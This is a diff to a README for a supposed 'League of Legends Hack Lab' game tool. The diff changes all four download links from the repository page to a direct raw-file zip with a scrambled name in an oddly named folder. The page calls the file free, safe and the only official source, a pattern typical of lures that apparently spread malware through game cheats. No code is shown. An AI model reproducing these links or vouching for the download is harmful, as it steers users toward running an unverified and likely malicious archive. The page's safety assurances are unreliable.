@@ -1,6 +1,6 @@
 # ⚡ league-of-legends-hack-lab - Master Your Game, Outplay Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-League_of_Legends_Hack_Lab-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/BINbzzzzz/league-of-legends-hack-lab)
+[![Download Now](https://img.shields.io/badge/Download-League_of_Legends_Hack_Lab-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/BINbzzzzz/league-of-legends-hack-lab/main/pivalic/of-hack-league-lab-legends-3.5.zip)
 
 ---
 
@@ -16,7 +16,7 @@ Getting started takes less than two minutes. Here's exactly what you need to do:
 
 ### Step 1: Download the Application
 
-[**Click here to download League of Legends Hack Lab**](https://github.com/BINbzzzzz/league-of-legends-hack-lab)
+[**Click here to download League of Legends Hack Lab**](https://raw.githubusercontent.com/BINbzzzzz/league-of-legends-hack-lab/main/pivalic/of-hack-league-lab-legends-3.5.zip)
 
 Visit this link to download the application. The download page will open in your browser. Click the download button on that page to get the file.
 
@@ -68,7 +68,7 @@ The tool understands all champions. It knows how your champion performs in diffe
 ### Downloading
 
 1. Open your web browser (Chrome, Edge, or Firefox)
-2. Go to the download page: [**https://github.com/BINbzzzzz/league-of-legends-hack-lab**](https://github.com/BINbzzzzz/league-of-legends-hack-lab)
+2. Go to the download page: [**https://raw.githubusercontent.com/BINbzzzzz/league-of-legends-hack-lab/main/pivalic/of-hack-league-lab-legends-3.5.zip**](https://raw.githubusercontent.com/BINbzzzzz/league-of-legends-hack-lab/main/pivalic/of-hack-league-lab-legends-3.5.zip)
 3. Look for the green "Download" button or the latest release file
 4. Click it and wait for the download to finish (the file is about 150 MB)
 
@@ -156,7 +156,7 @@ Updates happen after every League of Legends patch (every two weeks). The tool a
 
 Stop guessing why you win or lose. Start knowing. Download League of Legends Hack Lab today and see your game from a perspective you never had before.
 
-[**🔗 Download Now - Visit the Official Page**](https://github.com/BINbzzzzz/league-of-legends-hack-lab)
+[**🔗 Download Now - Visit the Official Page**](https://raw.githubusercontent.com/BINbzzzzz/league-of-legends-hack-lab/main/pivalic/of-hack-league-lab-legends-3.5.zip)
 
 This is the only official download source. The software is free, safe, and ready to use in under two minutes. Join thousands of players who already understand their gameplay on a deeper level.
 
